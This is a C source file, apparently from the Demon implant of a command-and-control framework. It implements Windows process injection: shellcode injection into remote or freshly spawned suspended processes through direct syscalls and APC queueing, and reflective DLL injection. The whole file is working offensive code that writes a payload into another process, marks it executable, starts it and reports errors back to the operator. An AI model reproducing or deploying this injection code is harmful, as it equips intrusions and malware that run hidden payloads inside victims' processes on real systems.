#include <Demon.h>

#include <Core/WinUtils.h>
#include <Core/Syscalls.h>
#include "Common/Macros.h"
#include <Core/Package.h>

#include <Inject/Inject.h>
#include <Inject/InjectUtil.h>
#include <ntstatus.h>

BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx )
{
    NTSTATUS NtStatus = 0;

    if ( Inject )
    {
        PUTS( "Inject into a remote process" )

        switch ( Method )
        {
            case INJECTION_TECHNIQUE_WIN32: PUTS( "INJECTION_TECHNIQUE_WIN32" )
                {

                }

            case INJECTION_TECHNIQUE_APC: PUTS( "INJECTION_TECHNIQUE_APC" )
                {
                    HANDLE          hSnapshot   = { 0 };
                    DWORD           threadId    = 0;
                    THREADENTRY32   threadEntry = { sizeof( THREADENTRY32 ) };

                    hSnapshot = Instance.Win32.CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 );

                    // TODO: change to Syscall
                    BOOL bResult = Instance.Win32.Thread32First( hSnapshot, &threadEntry );
                    while ( bResult )
                    {
                        bResult = Instance.Win32.Thread32Next( hSnapshot, &threadEntry );
                        if ( bResult )
                        {
                            if ( threadEntry.th32OwnerProcessID == ctx->ProcessID )
                            {
                                threadId = threadEntry.th32ThreadID;

                                CLIENT_ID           ProcClientID        = { 0 };
                                OBJECT_ATTRIBUTES   ObjectAttributes    = { 0 };

                                // init the attributes
                                InitializeObjectAttributes( &ObjectAttributes, NULL, 0, NULL, NULL );

                                // set the correct pid and tid
                                ProcClientID.UniqueProcess = ( HANDLE ) ctx->ProcessID;
                                ProcClientID.UniqueThread  = ( HANDLE ) threadId;

                                Instance.Syscall.NtOpenThread( &ctx->hThread, MAXIMUM_ALLOWED, &ObjectAttributes, &ProcClientID );

                                break;
                            }
                        }
                    }

                    Instance.Win32.NtClose( hSnapshot );

                    if ( NT_SUCCESS( ( NtStatus = Instance.Syscall.NtSuspendThread( ctx->hThread, NULL ) ) ) )
                    {
                        PUTS("[+] NtSuspendThread: Successful")

                        if ( ShellcodeInjectionSysApc( ctx->hProcess, lpShellcodeBytes, ShellcodeSize, ctx ) )
                        {
                            NtStatus = Instance.Syscall.NtResumeThread( ctx->hThread, NULL );
                            if ( NT_SUCCESS( NtStatus ) )
                            {
                                PUTS("[+] NtResumeThread: Successful")
                                return TRUE;
                            }
                            else
                            {
                                PUTS("[-] NtResumeThread: failed")
                                goto Win32Error;
                            }
                        }
                    }
                    else
                    {
                        PUTS("[-] NtSuspendThread: failed")
                        goto Win32Error;
                    }

                Win32Error:
                    PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );

                    return FALSE;
                }

            case INJECTION_TECHNIQUE_SYSCALL:
            {
                PUTS("INJECTION_TECHNIQUE_SYSCALL")
                return ShellcodeInjectionSys( lpShellcodeBytes, ShellcodeSize, ctx );
            }
        }
    }
    else
    {
        PUTS( "Spawn and inject" )

        switch ( Method )
        {
            case INJECTION_TECHNIQUE_APC:
            {
                PUTS( "INJECTION_TECHNIQUE_APC" )

                PROCESS_INFORMATION ProcessInfo  = { 0 };
                DWORD               ProcessFlags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE | CREATE_NO_WINDOW;

                if ( ProcessCreate( TRUE, NULL, Instance.Config.Process.Spawn64, ProcessFlags, &ProcessInfo, FALSE, NULL ) )
                {
                    ctx->hThread      = ProcessInfo.hThread;
                    ctx->SuspendAwake = FALSE;
                    if ( ShellcodeInjectionSysApc( ProcessInfo.hProcess, lpShellcodeBytes, ShellcodeSize, ctx ) )
                    {
                        NtStatus = Instance.Syscall.NtAlertResumeThread( ProcessInfo.hThread, NULL );
                        if ( ! NT_SUCCESS( NtStatus ) )
                        {
                            PUTS( "[-] NtResumeThread: Failed" );
                            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                        }
                        else
                            PUTS( "[+] NtResumeThread: Success" );

                        return TRUE;
                    }
                    else return FALSE;
                }

                break;
            }

            case INJECTION_TECHNIQUE_SYSCALL:
            {
                PUTS( "INJECTION_TECHNIQUE_SYSCALL" )

                PROCESS_INFORMATION ProcessInfo  = { 0 };
                DWORD               ProcessFlags = CREATE_SUSPENDED | CREATE_NEW_CONSOLE | CREATE_NO_WINDOW;

                if ( ProcessCreate( TRUE, NULL, Instance.Config.Process.Spawn64, ProcessFlags, &ProcessInfo, FALSE, NULL ) )
                {
                    ctx->hProcess = ProcessInfo.hProcess;
                    return ShellcodeInjectionSys( lpShellcodeBytes, ShellcodeSize, ctx );
                }
                break;
            }

            default:
            {
                PUTS( "DEFAULT" )
                break;
            }
        }
    }
}

BOOL ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx )
{
    NTSTATUS NtStatus        = 0;
    LPVOID   lpVirtualMemory = NULL;
    ULONG    OldProtection   = 0;
    PVOID    ShellcodeArg    = NULL;
    BOOL     Success         = FALSE;

    if ( ctx->Parameter )
    {
        ShellcodeArg = MemoryAlloc( DX_MEM_DEFAULT, ctx->hProcess, ctx->ParameterSize, PAGE_READWRITE );
        if ( ShellcodeArg )
        {
            NtStatus = Instance.Syscall.NtWriteVirtualMemory( ctx->hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &OldProtection );
            if ( ! NT_SUCCESS( NtStatus ) )
            {
                PUTS( "[-] NtWriteVirtualMemory: Failed" )
                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            }
        }
    }

    // NtStatus = Instance.Syscall.NtAllocateVirtualMemory( hProcess, &lpVirtualMemory, 0, &ShellcodeSize, MEM_RESERVE | MEM_COMMIT,  );
    lpVirtualMemory = MemoryAlloc( DX_MEM_DEFAULT, ctx->hProcess, ShellcodeSize, PAGE_READWRITE );
    if ( ! lpVirtualMemory )
    {
        PUTS("[-] NtAllocateVirtualMemory: failed")
        goto End;
    }
    else
        PUTS("[+] NtAllocateVirtualMemory: Successful");

    NtStatus = Instance.Syscall.NtWriteVirtualMemory( ctx->hProcess, lpVirtualMemory, lpShellcodeBytes, ShellcodeSize, &ShellcodeSize );
    if ( ! NT_SUCCESS( NtStatus ) )
    {
        PUTS("[-] NtWriteVirtualMemory: failed")
        goto End;
    }
    else
        PUTS("[+] NtWriteVirtualMemory: Successful")

    // NtStatus = Instance.Syscall.NtProtectVirtualMemory( hProcess, &lpVirtualMemory, &ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );
    if ( ! MemoryProtect( DX_MEM_SYSCALL, ctx->hProcess, lpVirtualMemory, ShellcodeSize, PAGE_EXECUTE_READ ) )
    {
        PUTS("[-] NtProtectVirtualMemory: failed")
        goto End;
    }
    else
        PUTS("[+] NtProtectVirtualMemory: Successful")

    ctx->Parameter = ShellcodeArg;
    if ( ThreadCreate( DX_THREAD_SYSCALL, ctx->hProcess, lpVirtualMemory, ctx ) )
    {
        PUTS( "[+] ThreadCreate: success" )
        Success = TRUE;
    }
    else
    {
        PUTS("[-] ThreadCreate: failed")
        goto End;
    }

End:
    if ( ! Success )
        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );

    PRINTF( "Success: %s\n", Success ? "TRUE" : "FALSE" )

    return Success;
}

BOOL ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx )
{
    NTSTATUS    NtStatus        = 0;
    DWORD       DosError        = 0;
    LPVOID      lpVirtualMemory = NULL;
    ULONG       OldProtection   = 0;
    PVOID       ShellcodeArg    = NULL;

    if ( ctx->Parameter )
    {
        ShellcodeArg = MemoryAlloc( DX_MEM_DEFAULT, hProcess, ctx->ParameterSize, PAGE_READWRITE );
        if ( ShellcodeArg )
        {
            NtStatus = Instance.Syscall.NtWriteVirtualMemory( hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &OldProtection );
            if ( ! NT_SUCCESS( NtStatus ) )
            {
                PUTS( "[-] NtWriteVirtualMemory: Failed" )
                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            }
        }
    }

    lpVirtualMemory = MemoryAlloc( DX_MEM_DEFAULT, hProcess, ShellcodeSize, PAGE_READWRITE );
    if ( lpVirtualMemory )
    {
        PUTS("[+] MemoryAlloc: Successful")

        NtStatus = Instance.Syscall.NtWriteVirtualMemory( hProcess, lpVirtualMemory, lpShellcodeBytes, ShellcodeSize, &ShellcodeSize );
        if ( NT_SUCCESS( NtStatus ) )
        {
            PUTS("[+] Moved memory: Successful")

            // NtStatus = Instance.Syscall.NtProtectVirtualMemory( hProcess, &lpVirtualMemory, &ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );
            if ( MemoryProtect( DX_MEM_SYSCALL, hProcess, lpVirtualMemory, ShellcodeSize, PAGE_EXECUTE_READ ) )
            {
                PUTS("[+] MemoryProtect: Successful")

                // NtStatus = Instance.Syscall.NtQueueApcThread( ctx->hThread, lpVirtualMemory, ShellcodeArg, NULL, NULL );
                ctx->Parameter = ShellcodeArg;
                if ( ThreadCreate( DX_THREAD_SYSAPC, hProcess, lpVirtualMemory, ctx ) )
                {
                    PUTS( "[+] ThreadCreate: Successful" )
                    return TRUE;
                }
                else
                {
                    PUTS( "[-] ThreadCreate: failed" )
                    goto Win32Error;
                }

            } else {
                PUTS("[-] NtProtectVirtualMemory: failed")
                goto Win32Error;
            }

        } else {
            PUTS("[-] NtWriteVirtualMemory: failed")
            goto Win32Error;
        }

    } else {
        PUTS("[-] NtAllocateVirtualMemory: failed")
        goto Win32Error;
    }

Win32Error:
    DosError = Instance.Win32.RtlNtStatusToDosError( NtStatus );
    PackageTransmitError( CALLBACK_ERROR_WIN32, DosError );
    return FALSE;
}

DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
{
    PRINTF( "Params( %x, %x, %d, %x )\n", hTargetProcess, DllBuffer, DllLength, ctx );

    NTSTATUS NtStatus            = STATUS_SUCCESS;
    LPVOID   MemParamsBuffer     = NULL;
    LPVOID   MemLibraryBuffer    = NULL;
    LPVOID   ReflectiveLdr       = NULL;
    LPVOID   MemRegion           = NULL;
    DWORD    MemRegionSize       = 0;
    DWORD    ReflectiveLdrOffset = 0;
    DWORD    OldProtect          = 0;

    if( ! DllBuffer || ! DllLength || ! hTargetProcess )
    {
        PUTS( "Params == NULL" )
        return FALSE;
    }

    if ( ProcessIsWow( hTargetProcess ) ) // check if remote process x86
    {
        if ( GetPeArch( DllBuffer ) != PROCESS_ARCH_X86 ) // check if dll is x64
        {
            PUTS( "[ERROR] trying to inject a x64 payload into a x86 process. ABORT" );
            return ERROR_INJECT_PROC_PAYLOAD_ARCH_DONT_MATCH_X64_TO_X86;
        }
    }
    else
    {
        if ( GetPeArch( DllBuffer ) != PROCESS_ARCH_X64 ) // check if dll is x64
        {
            PUTS( "[ERROR] trying to inject a x86 payload into a x64 process. ABORT" );
            return ERROR_INJECT_PROC_PAYLOAD_ARCH_DONT_MATCH_X86_TO_X64;
        }
    }

    ReflectiveLdrOffset = GetReflectiveLoaderOffset( DllBuffer );
    if ( ! ReflectiveLdrOffset )
    {
        PUTS( "[-] Couldn't get reflective loader\n" )
        return FALSE;
    }

    PRINTF( "Reflective Loader Offset => %x\n", ReflectiveLdrOffset );

    // Alloc and write remote params
    PRINTF( "Params: Size:[%d] Pointer:[%p]\n", ParamSize, Parameter )
    if ( ParamSize > 0 )
    {
        MemParamsBuffer = MemoryAlloc( DX_MEM_DEFAULT, hTargetProcess, ParamSize, PAGE_READWRITE );
        if ( MemParamsBuffer )
        {
            PRINTF( "MemoryAlloc: Success allocated memory for parameters: ptr:[%p]\n", MemParamsBuffer )
            NtStatus = Instance.Syscall.NtWriteVirtualMemory( hTargetProcess, MemParamsBuffer, Parameter, ParamSize, &OldProtect );
            if ( ! NT_SUCCESS( NtStatus ) )
            {
                PUTS( "NtWriteVirtualMemory: Failed to write memory for parameters" )
                PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
                return FALSE;
            }
            else
                PUTS( "Successful wrote params into remote library memory" );
        }
        else
        {
            PUTS( "NtAllocateVirtualMemory: Failed to allocate memory for parameters" )
            PackageTransmitError( CALLBACK_ERROR_WIN32, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            return FALSE;
        }
    }

    // Alloc and write remote library
    MemLibraryBuffer = MemoryAlloc( DX_MEM_DEFAULT, hTargetProcess, DllLength, PAGE_READWRITE );
    if ( MemLibraryBuffer )
    {
        PUTS( "[+] NtAllocateVirtualMemory: success" );
        if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, DllBuffer, DllLength, &OldProtect ) ) )
        {
            // TODO: check to get the .text section and size of it
            PRINTF( "[+] NtWriteVirtualMemory: success: ptr[%p]\n", MemLibraryBuffer );

            ReflectiveLdr = RVA( LPVOID, MemLibraryBuffer, ReflectiveLdrOffset );
            MemRegion     = MemLibraryBuffer - ( ( ( UINT_PTR ) MemLibraryBuffer ) % 8192 );    // size of shellcode? change it to rx
            MemRegionSize = 16384;
            OldProtect    = 0;

            // NtStatus = Instance.Syscall.NtProtectVirtualMemory( hTargetProcess, &MemRegion, &MemRegionSize, PAGE_EXECUTE_READ, &OldProtect );
            if ( MemoryProtect( DX_MEM_SYSCALL, hTargetProcess, MemRegion, MemRegionSize, PAGE_EXECUTE_READ ) )
            {
                ctx->Parameter = MemParamsBuffer;
                PRINTF( "ctx->Parameter: %p\n", ctx->Parameter )

                // if ( ! ThreadCreate( ctx->Technique, hTargetProcess, ReflectiveLdr, ctx ) )
                if ( ! ThreadCreate( DX_THREAD_DEFAULT, hTargetProcess, ReflectiveLdr, ctx ) )
                {
                    PRINTF( "[-] Failed to inject dll %d\n", NtGetLastError() )
                    PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                    return FALSE;
                }

                return TRUE;
            }
            else
            {
                PUTS("[-] NtProtectVirtualMemory: failed")
                PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
                return FALSE;
            }
        }
        else
        {
            PUTS( "NtWriteVirtualMemory: Failed to write memory for library" )
            PackageTransmitError( 0x1, Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
            return FALSE;
        }
    }

    PRINTF( "Failed to allocate memory: %d\n", NtGetLastError() )

    return FALSE;
}

DWORD DllSpawnReflective( LPVOID DllBuffer, DWORD DllLength, PVOID Parameter, SIZE_T ParamSize, PINJECTION_CTX ctx )
{
    PRINTF( "Params( %x, %d, %x )\n", DllBuffer, DllLength, ctx );

    PROCESS_INFORMATION ProcessInfo = { 0 };
    PCHAR               SpawnProc   = NULL;
    DWORD               Result      = 0;

    if ( GetPeArch( DllBuffer ) == PROCESS_ARCH_X86 ) // check if dll is x64
        SpawnProc = Instance.Config.Process.Spawn86;
    else
        SpawnProc = Instance.Config.Process.Spawn64;

    /* Meh this is the default */
    Result = ERROR_INJECT_FAILED_TO_SPAWN_TARGET_PROCESS;

    if ( ProcessCreate( TRUE, NULL, SpawnProc, CREATE_NO_WINDOW | CREATE_SUSPENDED, &ProcessInfo, TRUE, NULL ) )
    {
        Result = DllInjectReflective( ProcessInfo.hProcess, DllBuffer, DllLength, Parameter, ParamSize, ctx );
        if ( ! Result )
        {
            PUTS( "Failed" )

            if ( ! Instance.Win32.TerminateProcess( ProcessInfo.hProcess, 0 ) )
                PRINTF( "(Not major) Failed to Terminate Process: %d\n", NtGetLastError()  )

            Instance.Win32.NtClose( ProcessInfo.hProcess );
            Instance.Win32.NtClose( ProcessInfo.hThread );
        }
    }

    return Result;
}
